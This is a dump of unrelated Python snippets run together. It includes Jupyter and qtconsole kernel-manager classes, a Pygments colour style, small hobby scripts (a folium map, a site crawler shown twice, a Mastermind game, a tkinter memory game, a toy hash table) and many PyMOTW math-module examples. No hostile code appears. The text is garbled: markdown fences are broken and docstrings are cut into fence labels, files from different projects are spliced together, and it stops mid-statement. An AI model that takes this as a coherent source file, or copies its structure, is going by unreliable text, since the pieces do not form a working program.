            self._timer = QtCore.QTimer()
            self._timer.timeout.connect(self.poll)
        self._timer.start(round(self.time_to_dead * 1000))

    def stop(self):
        self._timer.stop()

    def poll(self):
        super().poll()


class QtKernelManager(KernelManager, QtKernelManagerMixin):
    """A KernelManager with Qt signals for restart"""

    client_class = DottedObjectName('qtconsole.client.QtKernelClient')
    autorestart = Bool(True, config=True)

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._is_restarting = False

    def start_restarter(self):
        """Start restarter mechanism."""
        if self.autorestart and self.has_kernel:
            if self._restarter is None:
                self._restarter = QtKernelRestarter(
                    kernel_manager=self,
                    parent=self,
                    log=self.log,
                )
                self._restarter.add_callback(self._handle_kernel_restarting)
            self._restarter.start()

    def stop_restarter(self):
        """Stop restarter mechanism."""
        if self.autorestart:
            if self._restarter is not None:
                self._restarter.stop()

    def post_start_kernel(self, **kw):
        """Kernel restarted."""
        super().post_start_kernel(**kw)
        if self._is_restarting:
            self.kernel_restarted.emit()
            self._is_restarting = False

    def _handle_kernel_restarting(self):
        """Kernel has died, and will be restarted."""
        self._is_restarting = True
```

```pyAbstract base class for kernel managers."""
# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.
import abc


class KernelManagerABC(object, metaclass=abc.ABCMeta):
    """KernelManager ABC.

    The docstrings for this class can be found in the base implementation:

    `jupyter_client.kernelmanager.KernelManager`
    """

    @abc.abstractproperty
    def kernel(self):
        pass

    # --------------------------------------------------------------------------
    # Kernel management
    # --------------------------------------------------------------------------

    @abc.abstractmethod
    def start_kernel(self, **kw):
        pass

    @abc.abstractmethod
    def shutdown_kernel(self, now=False, restart=False):
        pass

    @abc.abstractmethod
    def restart_kernel(self, now=False, **kw):
        pass

    @abc.abstractproperty
    def has_kernel(self):
        pass

    @abc.abstractmethod
    def interrupt_kernel(self):
        pass

    @abc.abstractmethod
    def signal_kernel(self, signum):
        pass

    @abc.abstractmethod
    def is_alive(self):
        pass
```

````py
    pygments.styles.manni
    ~~~~~~~~~~~~~~~~~~~~~

    A colorful style, inspired by the terminal highlighting style.

    This is a port of the style used in the `php port`_ of pygments
    by Manni. The style is called 'default' there.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, \
     Number, Operator, Generic, Whitespace


class ManniStyle(Style):
    """
    A colorful style, inspired by the terminal highlighting style.
    """

    background_color = '#f0f3f3'

    styles = {
        Whitespace:         '#bbbbbb',
        Comment:            'italic #0099FF',
        Comment.Preproc:    'noitalic #009999',
        Comment.Special:    'bold',

        Keyword:            'bold #006699',
        Keyword.Pseudo:     'nobold',
        Keyword.Type:       '#007788',

        Operator:           '#555555',
        Operator.Word:      'bold #000000',

        Name.Builtin:       '#336666',
        Name.Function:      '#CC00FF',
        Name.Class:         'bold #00AA88',
        Name.Namespace:     'bold #00CCFF',
        Name.Exception:     'bold #CC0000',
        Name.Variable:      '#003333',
        Name.Constant:      '#336600',
        Name.Label:         '#9999FF',
        Name.Entity:        'bold #999999',
        Name.Attribute:     '#330099',
        Name.Tag:           'bold #330099',
        Name.Decorator:     '#9999FF',

        String:             '#CC3300',
        String.Doc:         'italic',
        String.Interpol:    '#AA0000',
        String.Escape:      'bold #CC3300',
        String.Regex:       '#33AAAA',
        String.Symbol:      '#FFCC33',
        String.Other:       '#CC3300',

        Number:             '#FF6600',

        Generic.Heading:    'bold #003300',
        Generic.Subheading: 'bold #003300',
        Generic.Deleted:    'border:#CC0000 bg:#FFCCCC',
        Generic.Inserted:   'border:#00CC00 bg:#CCFFCC',
        Generic.Error:      '#FF0000',
        Generic.Emph:       'italic',
        Generic.Strong:     'bold',
        Generic.Prompt:     'bold #000099',
        Generic.Output:     '#AAAAAA',
        Generic.Traceback:  '#99CC66',

        Error:              'bg:#FFAAAA #AA0000'
    }

#import Nominatim, folium and webbrowser packages
from geopy.geocoders import Nominatim
import folium
import webbrowser

locator = Nominatim(user_agent='http://open.mapquestapi.com/nominatim/v1/search.php')

#get the location and covert it into lowercase
loc = input('Enter the location : ')
#get the coordinates of your loction
loc = locator.geocode(loc)
#Map method of folium return Map object
#pass the coordinates of your location
mp=folium.Map(location= [loc.latitude,loc.longitude],zoom_start= 15)

#adds parachute style marker with pop-up text
folium.Marker([loc.latitude,loc.longitude],popup = loc).add_to(mp)

#save your map and open it using webbrowser
mp.save('map.html')
webbrowser.open('map.html')
# "Hard" question, supposed to take 30 min but took me almost 2 hours
# the zeros really threw me a curveball

# asked by MS, Uber, FB apparently


def mapDecoding(message):
    counts = [0, 1]
    size = len(message)

    # special cases
    if size == 0:
        return 1
    if int(message[0]) == 0:
        return 0
    if size == 1:
        return 1
    for i in range(size):
        if int(message[i]) == 0 and not (0 < int(message[i - 1]) <= 2):
            return 0

    former = int(message[0])
    last = int(message[1])
    if former == 1 and last != 0:
        counts.append(2)
    elif former == 2 and 0 < last <= 6:
        counts.append(2)
    else:
        counts.append(1)

    previous_op_count = counts[-1]

    for i in range(2, size):
        curr = int(message[i])
        if curr == 0:
            former = last
            last = curr
            while counts[-1] != previous_op_count:
                counts.pop()
            continue

        if 0 < former <= 2:
            if 0 < last <= 2:
                if (last == 2 and 0 < curr <= 6) or (last == 1 and 0 < curr):
                    previous_op_count = counts[-1]
                    counts.append((counts[-1] + counts[-2]) % (10 ** 9 + 7))
                else:
                    counts.append(counts[-1])
        elif (last == 2 and 0 < curr <= 6) or (last == 1 and 0 < curr):
            previous_op_count = counts[-1]
            counts.append(counts[-1] * 2 % (10 ** 9 + 7))
        else:
            counts.append(counts[-1])

        former = last
        last = curr

    return counts[-1]

from bs4 import BeautifulSoup
import requests
import requests.exceptions
from urllib.parse import urlsplit
from urllib.parse import urlparse
from collections import deque
import re

url = "https://scrapethissite.com"
# a queue of urls to be crawled
new_urls = deque([url])

# a set of urls that we have already been processed
processed_urls = set()
# a set of domains inside the target website
local_urls = set()
# a set of domains outside the target website
foreign_urls = set()
# a set of broken urls
broken_urls = set()

# process urls one by one until we exhaust the queue
while len(new_urls):
    # move next url from the queue to the set of processed urls
    url = new_urls.popleft()
    processed_urls.add(url)
    # get url's content
    print("Processing %s" % url)
    try:
        response = requests.get(url)
    except (
        requests.exceptions.MissingSchema,
        requests.exceptions.ConnectionError,
        requests.exceptions.InvalidURL,
        requests.exceptions.InvalidSchema,
    ):
        # add broken urls to it's own set, then continue
        broken_urls.add(url)
        continue

    # extract base url to resolve relative links
    parts = urlsplit(url)
    base = "{0.netloc}".format(parts)
    strip_base = base.replace("www.", "")
    base_url = "{0.scheme}://{0.netloc}".format(parts)
    path = url[: url.rfind("/") + 1] if "/" in parts.path else url

    # create a beutiful soup for the html document
    soup = BeautifulSoup(response.text, "lxml")

    for link in soup.find_all("a"):
        # extract link url from the anchor
        anchor = link.attrs["href"] if "href" in link.attrs else ""

        if anchor.startswith("/"):
            local_link = base_url + anchor
            local_urls.add(local_link)
        elif strip_base in anchor:
            local_urls.add(anchor)
        elif not anchor.startswith("http"):
            local_link = path + anchor
            local_urls.add(local_link)
        else:
            foreign_urls.add(anchor)

        for i in local_urls:
            if not i in new_urls and not i in processed_urls:
                new_urls.append(i)

print(processed_urls)

from bs4 import BeautifulSoup
import requests
import requests.exceptions
from urllib.parse import urlsplit
from urllib.parse import urlparse
from collections import deque
import re

url = "https://scrapethissite.com"
# a queue of urls to be crawled
new_urls = deque([url])

# a set of urls that we have already been processed
processed_urls = set()
# a set of domains inside the target website
local_urls = set()
# a set of domains outside the target website
foreign_urls = set()
# a set of broken urls
broken_urls = set()

# process urls one by one until we exhaust the queue
while len(new_urls):
    # move next url from the queue to the set of processed urls
    url = new_urls.popleft()
    processed_urls.add(url)
    # get url's content
    print("Processing %s" % url)
    try:
        response = requests.get(url)
    except (
        requests.exceptions.MissingSchema,
        requests.exceptions.ConnectionError,
        requests.exceptions.InvalidURL,
        requests.exceptions.InvalidSchema,
    ):
        # add broken urls to it's own set, then continue
        broken_urls.add(url)
        continue

    # extract base url to resolve relative links
    parts = urlsplit(url)
    base = "{0.netloc}".format(parts)
    strip_base = base.replace("www.", "")
    base_url = "{0.scheme}://{0.netloc}".format(parts)
    path = url[: url.rfind("/") + 1] if "/" in parts.path else url

    # create a beutiful soup for the html document
    soup = BeautifulSoup(response.text, "lxml")

    for link in soup.find_all("a"):
        # extract link url from the anchor
        anchor = link.attrs["href"] if "href" in link.attrs else ""

        if anchor.startswith("/"):
            local_link = base_url + anchor
            local_urls.add(local_link)
        elif strip_base in anchor:
            local_urls.add(anchor)
        elif not anchor.startswith("http"):
            local_link = path + anchor
            local_urls.add(local_link)
        else:
            foreign_urls.add(anchor)

        for i in local_urls:
            if not i in new_urls and not i in processed_urls:
                new_urls.append(i)

print(processed_urls)


def my_hash(s):
    # turn the string in to some numbers
    nums = s.encode()
    sum = 0

    for b in nums:
        sum += b

    return sum

hash_table = [None] * 8 # lets start with size 8 as our clamping size

# take the hash and turn it in to an index clamped to the size of a list

h = my_hash("Hello")
i = h % len(hash_table)
hash_table[i] = "Some hello value"

h = my_hash("World")
i = h % len(hash_table)
hash_table[i] = "Some World value"

h = my_hash("World")
i = h % len(hash_table)
hash_table[i] = "Some other World value"

# # get value from the hash table at the key
# # O(1)
# h = my_hash("World")
# i = h % len(hash_table)
# v = hash_table[i]
# print(v)

# # get value from the hash table at the key
# # O(1)
# h = my_hash("Frogs")
# print(h)
# i = h % len(hash_table)
# v = hash_table[i]
# print(v)


# delete
h = my_hash("Hello")
i = h % len(hash_table)
hash_table[i] = None

# get value from the hash table at the key
# O(1)
h = my_hash("Hello")
i = h % len(hash_table)
v = hash_table[i]
print(v)
# print(hash_table)
# Copyright (c) 2020 Frank Harrison <frank@doublethefish.com>
# Copyright (c) 2021 Pierre Sassoulas <pierre.sassoulas@gmail.com>
# Copyright (c) 2021 Marc Mueller <30130371+cdce8p@users.noreply.github.com>

# Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
# For details: https://github.com/PyCQA/pylint/blob/main/LICENSE
import abc


class MapReduceMixin(metaclass=abc.ABCMeta):
    """A mixin design to allow multiprocess/threaded runs of a Checker"""

    @abc.abstractmethod
    def get_map_data(self):
        """Returns mergable/reducible data that will be examined"""

    @classmethod
    @abc.abstractmethod
    def reduce_map_data(cls, linter, data):
        """For a given Checker, receives data for all mapped runs"""
````

````pyMarkdown Exporter class"""

# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.

from traitlets import default
from traitlets.config import Config

from .templateexporter import TemplateExporter


class MarkdownExporter(TemplateExporter):
    """
    Exports to a markdown document (.md)
    """
    export_from_notebook = "Markdown"

    @default('file_extension')
    def _file_extension_default(self):
        return '.md'

    @default('template_name')
    def _template_name_default(self):
        return 'markdown'

    output_mimetype = 'text/markdown'

    @default('raw_mimetypes')
    def _raw_mimetypes_default(self):
        return ['text/markdown', 'text/html', '']

    @property
    def default_config(self):
        c = Config({
            'ExtractOutputPreprocessor': {'enabled': True},
            'NbConvertBase': {
                'display_data_priority': ['text/html',
                                          'text/markdown',
                                          'image/svg+xml',
                                          'text/latex',
                                          'image/png',
                                          'image/jpeg',
                                          'text/plain'
                                          ]
            },
            'HighlightMagicsPreprocessor': {
                'enabled':True
                },
        })
        c.merge(super().default_config)
        return c

import os.path

DELETE_MARKER_MESSAGE = '''\
This file is placed here by pip to indicate the source was put
here by pip.

Once this package is successfully installed this source code will be
deleted (unless you remove this file).
'''
PIP_DELETE_MARKER_FILENAME = 'pip-delete-this-directory.txt'


def has_delete_marker_file(directory):
    # type: (str) -> bool
    return os.path.exists(os.path.join(directory, PIP_DELETE_MARKER_FILENAME))


def write_delete_marker_file(directory):
    # type: (str) -> None
    """
    Write the pip delete marker file into this directory.
    """
    filepath = os.path.join(directory, PIP_DELETE_MARKER_FILENAME)
    with open(filepath, 'w') as marker_fp:
        marker_fp.write(DELETE_MARKER_MESSAGE)

from __future__ import annotations

from collections import Counter
from random import random


class MarkovChainGraphUndirectedUnweighted:
    """
    Undirected Unweighted Graph for running Markov Chain Algorithm
    """

    def __init__(self):
        self.connections = {}

    def add_node(self, node: str) -> None:
        self.connections[node] = {}

    def add_transition_probability(
        self, node1: str, node2: str, probability: float
    ) -> None:
        if node1 not in self.connections:
            self.add_node(node1)
        if node2 not in self.connections:
            self.add_node(node2)
        self.connections[node1][node2] = probability

    def get_nodes(self) -> list[str]:
        return list(self.connections)

    def transition(self, node: str) -> str:
        current_probability = 0
        random_value = random()

        for dest in self.connections[node]:
            current_probability += self.connections[node][dest]
            if current_probability > random_value:
                return dest


def get_transitions(
    start: str, transitions: list[tuple[str, str, float]], steps: int
) -> dict[str, int]:
    """
    Running Markov Chain algorithm and calculating the number of times each node is
    visited

    >>> transitions = [
    ... ('a', 'a', 0.9),
    ... ('a', 'b', 0.075),
    ... ('a', 'c', 0.025),
    ... ('b', 'a', 0.15),
    ... ('b', 'b', 0.8),
    ... ('b', 'c', 0.05),
    ... ('c', 'a', 0.25),
    ... ('c', 'b', 0.25),
    ... ('c', 'c', 0.5)
    ... ]

    >>> result = get_transitions('a', transitions, 5000)

    >>> result['a'] > result['b'] > result['c']
    True
    """

    graph = MarkovChainGraphUndirectedUnweighted()

    for node1, node2, probability in transitions:
        graph.add_transition_probability(node1, node2, probability)

    visited = Counter(graph.get_nodes())
    node = start

    for _ in range(steps):
        node = graph.transition(node)
        visited[node] += 1

    return visited


if __name__ == "__main__":
    import doctest

    doctest.testmod()

from marvel import  Marvel
m=Marvel("","")#write public and private keys here
characters=m.characters
#for getting all info from id
all_characters=characters.all()
#getting information of consecutive six characters by id
x=1011334
for n in range(0,6):
    all_characters=characters.comics(x)
    x=x+1
    #for getting output in proper format
    for i in range(1,12):
        print(all_characters['data']['results'][int(i)]['title'])




# MasterMind Game

import random
num=random.randrange(1000,10000)
n=int(input("Guess the four digit number:"))
if(n==num):
    print("Great! you guessed the number in your first try!")
    print("Congrats! You are the winner.")
else:
    ctr=0
    while n!=num:
        ctr +=1
        count=0
        n=str(n)
        num=str(num)
        correct=['X']*4
        for i in range(0,4):
            if(n[i]==num[i]):
                count +=1
                correct[i] = n[i]
            else:
                continue
        if count<4 and count!=0:
            print("Not quite the number.But you did get ", count, "digits(s) correct!")
            print("Also these numbers in your input were correct!")
            for k in correct:
                print(k,end=" ")
            print("\n")
            print("\n")
            n=int(input("Enter your next choice of numbers: "))
        elif count==0:
            print("None of the numbers in your input match.")
            n=int(input("Enter your next choice of numbers: "))
    if n==num:
        print("You've become a Mastermind!")
        print("It took you only", ctr, "tries!")

import random as rd
import time as t
import tkinter as tk

#function to show different symbols
#here it also checks if first card is same as second or not
def show_symbols(i, j):
    global first_card
    global previous_X
    global previous_Y
    buttons[i, j]['text'] = button_symbols[i, j]
    buttons[i, j].update_idletasks()

    if first_card:
        previous_X = i
        previous_Y = j
        first_card = False

    elif previous_X != i or previous_Y != j:
        if buttons[previous_X, previous_Y]['text'] != buttons[i, j]['text']:

            t.sleep(0.5)
            buttons[previous_X, previous_Y]['text'] = ' '
            buttons[i, j]['text'] = ' '
        else:
            buttons[previous_X, previous_Y]['command'] = tk.DISABLED

            buttons[i, j]['command'] = tk.DISABLED
        first_card = True


window = tk.Tk()

window.background = "red"
window.title("Matchmaker by Neel Shah")
window.resizable(width=False, height=False)

first_card = True
previous_X = 0
previous_Y = 0
buttons = {}
button_symbols = {}

symbol_list = [u'\u03B1', u'\u03B2', u'\u03B3', u'\u03B4', u'\u03B5', u'\u03B6',
               u'\u03B7', u'\u03B8', u'\u03BB', u'\u03BC', u'\u03BE', u'\u03BF',
               u'\u03B1', u'\u03B2', u'\u03B3', u'\u03B4', u'\u03B5', u'\u03B6',
               u'\u03B7', u'\u03B8', u'\u03BB', u'\u03BC', u'\u03BE', u'\u03BF']

rd.shuffle(symbol_list)

#designing the grid
for i in range(6):
    for j in range(4):
        button = tk.Button(master=window, command=lambda i=i, j=j: show_symbols(i, j), width=8, height=5, bg='green',
                           fg='red', font=('Helvetica', '20'))
        button.grid(column=i, row=j)
        buttons[i, j] = button
        button_symbols[i, j] = symbol_list.pop()

window.mainloop()```


```py
    pygments.lexers.math
    ~~~~~~~~~~~~~~~~~~~~

    Just export lexers that were contained in this module.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.lexers.python import NumPyLexer
from pygments.lexers.matlab import MatlabLexer, MatlabSessionLexer, \
    OctaveLexer, ScilabLexer
from pygments.lexers.julia import JuliaLexer, JuliaConsoleLexer
from pygments.lexers.r import RConsoleLexer, SLexer, RdLexer
from pygments.lexers.modeling import BugsLexer, JagsLexer, StanLexer
from pygments.lexers.idl import IDLLexer
from pygments.lexers.algebra import MuPADLexer

__all__ = []

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyConstants in the math module.```


```py

#end_pymotw_header
import math

print('  π: {:.30f}'.format(math.pi))
print('  e: {:.30f}'.format(math.e))
print('nan: {:.30f}'.format(math.nan))
print('inf: {:.30f}'.format(math.inf))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyChecking the sign of a value.```


```py

#end_pymotw_header
import math

HEADINGS = ('f', 's', '< 0', '> 0', '= 0')
print('{:^5} {:^5} {:^5} {:^5} {:^5}'.format(*HEADINGS))
print('{:-^5} {:-^5} {:-^5} {:-^5} {:-^5}'.format(
    '', '', '', '', '',
))

VALUES = [
    -1.0,
    0.0,
    1.0,
    float('-inf'),
    float('inf'),
    float('-nan'),
    float('nan'),
]

for f in VALUES:
    s = int(math.copysign(1, f))
    print('{:5.1f} {:5d} {!s:5} {!s:5} {!s:5}'.format(
        f, s, f < 0, f > 0, f == 0,
    ))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyConverting from radians to degrees.```


```py

#end_pymotw_header
import math

INPUTS = [
    (0, 0),
    (math.pi / 6, 30),
    (math.pi / 4, 45),
    (math.pi / 3, 60),
    (math.pi / 2, 90),
    (math.pi, 180),
    (3 * math.pi / 2, 270),
    (2 * math.pi, 360),
]

print('{:^8} {:^8} {:^8}'.format(
    'Radians', 'Degrees', 'Expected'))
print('{:-^8} {:-^8} {:-^8}'.format('', '', ''))
for rad, expected in INPUTS:
    print('{:8.2f} {:8.2f} {:8.2f}'.format(
        rad,
        math.degrees(rad),
        expected,
    ))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyCalculate the distance to a point.```


```py

#end_pymotw_header
import math

print('{:^8} {:^8} {:^8} {:^8} {:^8}'.format(
    'X1', 'Y1', 'X2', 'Y2', 'Distance',
))
print('{:-^8} {:-^8} {:-^8} {:-^8} {:-^8}'.format(
    '', '', '', '', '',
))

POINTS = [
    ((5, 5), (6, 6)),
    ((-6, -6), (-5, -5)),
    ((0, 0), (3, 4)),  # 3-4-5 triangle
    ((-1, -1), (2, 3)),  # 3-4-5 triangle
]

for (x1, y1), (x2, y2) in POINTS:
    x = x1 - x2
    y = y1 - y2
    h = math.hypot(x, y)
    print('{:8.2f} {:8.2f} {:8.2f} {:8.2f} {:8.2f}'.format(
        x1, y1, x2, y2, h,
    ))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyGauss Error Function```


```py

#end_pymotw_header
import math

print('{:^5} {:7}'.format('x', 'erf(x)'))
print('{:-^5} {:-^7}'.format('', ''))

for x in [-3, -2, -1, -0.5, -0.25, 0, 0.25, 0.5, 1, 2, 3]:
    print('{:5.2f} {:7.4f}'.format(x, math.erf(x)))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyGauss Error Function```


```py

#end_pymotw_header
import math

print('{:^5} {:7}'.format('x', 'erfc(x)'))
print('{:-^5} {:-^7}'.format('', ''))

for x in [-3, -2, -1, -0.5, -0.25, 0, 0.25, 0.5, 1, 2, 3]:
    print('{:5.2f} {:7.4f}'.format(x, math.erfc(x)))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRaise e to a power.```


```py

#end_pymotw_header
import math

x = 2

fmt = '{:.20f}'
print(fmt.format(math.e ** 2))
print(fmt.format(math.pow(math.e, 2)))
print(fmt.format(math.exp(2)))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyLogarithms close to zero.```


```py

#end_pymotw_header
import math

x = 0.0000000000000000000000001

print(x)
print(math.exp(x) - 1)
print(math.expm1(x))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyAbsolute value```


```py

#end_pymotw_header
import math

print(math.fabs(-1.1))
print(math.fabs(-0.0))
print(math.fabs(0.0))
print(math.fabs(1.1))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyFactorial```


```py

#end_pymotw_header
import math

for i in [0, 1.0, 2.0, 3.0, 4.0, 5.0, 6.1]:
    try:
        print('{:2.0f} {:6.0f}'.format(i, math.factorial(i)))
    except ValueError as err:
        print('Error computing factorial({}): {}'.format(i, err))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyFloating point modulo```


```py

#end_pymotw_header
import math

print('{:^4} {:^4} {:^5} {:^5}'.format(
    'x', 'y', '%', 'fmod'))
print('{:-^4} {:-^4} {:-^5} {:-^5}'.format(
    '-', '-', '-', '-'))

INPUTS = [
    (5, 2),
    (5, -2),
    (-5, 2),
]

for x, y in INPUTS:
    print('{:4.1f} {:4.1f} {:5.2f} {:5.2f}'.format(
        x,
        y,
        x % y,
        math.fmod(x, y),
    ))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySeparate mantissa from exponent.```


```py

#end_pymotw_header
import math

print('{:^7} {:^7} {:^7}'.format('x', 'm', 'e'))
print('{:-^7} {:-^7} {:-^7}'.format('', '', ''))

for x in [0.1, 0.5, 4.0]:
    m, e = math.frexp(x)
    print('{:7.2f} {:7.2f} {:7d}'.format(x, m, e))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyCalculating accurate sums of floating point values.```


```py

#end_pymotw_header
import math

values = [0.1] * 10

print('Input values:', values)

print('sum()       : {:.20f}'.format(sum(values)))

s = 0.0
for i in values:
    s += i
print('for-loop    : {:.20f}'.format(s))

print('math.fsum() : {:.20f}'.format(math.fsum(values)))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyFactorial```


```py

#end_pymotw_header
import math

for i in [0, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6]:
    try:
        print('{:2.1f} {:6.2f}'.format(i, math.gamma(i)))
    except ValueError as err:
        print('Error computing gamma({}): {}'.format(i, err))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyGreatest common denominator```


```py

#end_pymotw_header
import math

print(math.gcd(10, 8))
print(math.gcd(10, 0))
print(math.gcd(50, 225))
print(math.gcd(11, 9))
print(math.gcd(0, 0))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyHyperbolic functions```


```py

#end_pymotw_header
import math

print('{:^6} {:^6} {:^6} {:^6}'.format(
    'X', 'sinh', 'cosh', 'tanh',
))
print('{:-^6} {:-^6} {:-^6} {:-^6}'.format('', '', '', ''))

fmt = '{:6.4f} {:6.4f} {:6.4f} {:6.4f}'

for i in range(0, 11, 2):
    x = i / 10.0
    print(fmt.format(
        x,
        math.sinh(x),
        math.cosh(x),
        math.tanh(x),
    ))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyCalculate the distance to a point.```


```py

#end_pymotw_header
import math

print('{:^7} {:^7} {:^10}'.format('X', 'Y', 'Hypotenuse'))
print('{:-^7} {:-^7} {:-^10}'.format('', '', ''))

POINTS = [
    # simple points
    (1, 1),
    (-1, -1),
    (math.sqrt(2), math.sqrt(2)),
    (3, 4),  # 3-4-5 triangle
    # on the circle
    (math.sqrt(2) / 2, math.sqrt(2) / 2),  # pi/4 rads
    (0.5, math.sqrt(3) / 2),  # pi/3 rads
]

for x, y in POINTS:
    h = math.hypot(x, y)
    print('{:7.2f} {:7.2f} {:7.2f}'.format(x, y, h))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyConverting floats to ints.```


```py

#end_pymotw_header
import math

HEADINGS = ('i', 'int', 'trunk', 'floor', 'ceil')
print('{:^5} {:^5} {:^5} {:^5} {:^5}'.format(*HEADINGS))
print('{:-^5} {:-^5} {:-^5} {:-^5} {:-^5}'.format(
    '', '', '', '', '',
))

fmt = '{:5.1f} {:5.1f} {:5.1f} {:5.1f} {:5.1f}'

TEST_VALUES = [
    -1.5,
    -0.8,
    -0.5,
    -0.2,
    0,
    0.2,
    0.5,
    0.8,
    1,
]

for i in TEST_VALUES:
    print(fmt.format(
        i,
        int(i),
        math.trunc(i),
        math.floor(i),
        math.ceil(i),
    ))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyInverse trigonometric functions```


```py

#end_pymotw_header
import math

for r in [0, 0.5, 1]:
    print('arcsine({:.1f})    = {:5.2f}'.format(r, math.asin(r)))
    print('arccosine({:.1f})  = {:5.2f}'.format(r, math.acos(r)))
    print('arctangent({:.1f}) = {:5.2f}'.format(r, math.atan(r)))
    print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyComparing floating point values```


```py
# abs(a-b) <= max(rel_tol * max(abs(a), abs(b)), abs_tol)

#end_pymotw_header
import math

INPUTS = [
    (1000, 900, 0.1),
    (100, 90, 0.1),
    (10, 9, 0.1),
    (1, 0.9, 0.1),
    (0.1, 0.09, 0.1),
]

print('{:^8} {:^8} {:^8} {:^8} {:^8} {:^8}'.format(
    'a', 'b', 'rel_tol', 'abs(a-b)', 'tolerance', 'close')
)
print('{:-^8} {:-^8} {:-^8} {:-^8} {:-^8} {:-^8}'.format(
    '-', '-', '-', '-', '-', '-'),
)

fmt = '{:8.2f} {:8.2f} {:8.2f} {:8.2f} {:8.2f} {!s:>8}'

for a, b, rel_tol in INPUTS:
    close = math.isclose(a, b, rel_tol=rel_tol)
    tolerance = rel_tol * max(abs(a), abs(b))
    abs_diff = abs(a - b)
    print(fmt.format(a, b, rel_tol, abs_diff, tolerance, close))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyComparing floating point values```


```py
# abs(a-b) <= max(rel_tol * max(abs(a), abs(b)), abs_tol)

#end_pymotw_header
import math

INPUTS = [
    (1.0, 1.0 + 1e-07, 1e-08),
    (1.0, 1.0 + 1e-08, 1e-08),
    (1.0, 1.0 + 1e-09, 1e-08),
]

print('{:^8} {:^11} {:^8} {:^10} {:^8}'.format(
    'a', 'b', 'abs_tol', 'abs(a-b)', 'close')
)
print('{:-^8} {:-^11} {:-^8} {:-^10} {:-^8}'.format(
    '-', '-', '-', '-', '-'),
)

for a, b, abs_tol in INPUTS:
    close = math.isclose(a, b, abs_tol=abs_tol)
    abs_diff = abs(a - b)
    print('{:8.2f} {:11} {:8} {:0.9f} {!s:>8}'.format(
        a, b, abs_tol, abs_diff, close))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyComparing floating point values```


```py
# abs(a-b) <= max(rel_tol * max(abs(a), abs(b)), abs_tol)

#end_pymotw_header
import math

print('nan, nan:', math.isclose(math.nan, math.nan))
print('nan, 1.0:', math.isclose(math.nan, 1.0))
print('inf, inf:', math.isclose(math.inf, math.inf))
print('inf, 1.0:', math.isclose(math.inf, 1.0))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyChecking for overflow or infinite values.```


```py

#end_pymotw_header
import math

for f in [0.0, 1.0, math.pi, math.e, math.inf, math.nan]:
    print('{:5.2f} {!s}'.format(f, math.isfinite(f)))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyChecking for overflow or infinite values.```


```py

#end_pymotw_header
import math

print('{:^3} {:6} {:6} {:6}'.format(
    'e', 'x', 'x**2', 'isinf'))
print('{:-^3} {:-^6} {:-^6} {:-^6}'.format(
    '', '', '', ''))

for e in range(0, 201, 20):
    x = 10.0 ** e
    y = x * x
    print('{:3d} {:<6g} {:<6g} {!s:6}'.format(
        e, x, y, math.isinf(y),
    ))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyTesting for not-a-number.```


```py

#end_pymotw_header
import math

x = (10.0 ** 200) * (10.0 ** 200)
y = x / x

print('x =', x)
print('isnan(x) =', math.isnan(x))
print('y = x / x =', x / x)
print('y == nan =', y == float('nan'))
print('isnan(y) =', math.isnan(y))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyFrom mantissa, exponent pair to floating point value.```


```py

#end_pymotw_header
import math

print('{:^7} {:^7} {:^7}'.format('m', 'e', 'x'))
print('{:-^7} {:-^7} {:-^7}'.format('', '', ''))

INPUTS = [
    (0.8, -3),
    (0.5, 0),
    (0.5, 3),
]

for m, e in INPUTS:
    x = math.ldexp(m, e)
    print('{:7.2f} {:7d} {:7.2f}'.format(m, e, x))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyNatural logarithm of Gamma```


```py

#end_pymotw_header
import math

for i in [0, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6]:
    try:
        print('{:2.1f} {:.20f} {:.20f}'.format(
            i,
            math.lgamma(i),
            math.log(math.gamma(i)),
        ))
    except ValueError as err:
        print('Error computing lgamma({}): {}'.format(i, err))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyLogarithms```


```py

#end_pymotw_header
import math

print(math.log(8))
print(math.log(8, 2))
print(math.log(0.5, 2))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pylog10 example```


```py

#end_pymotw_header
import math

print('{:2} {:^12} {:^10} {:^20} {:8}'.format(
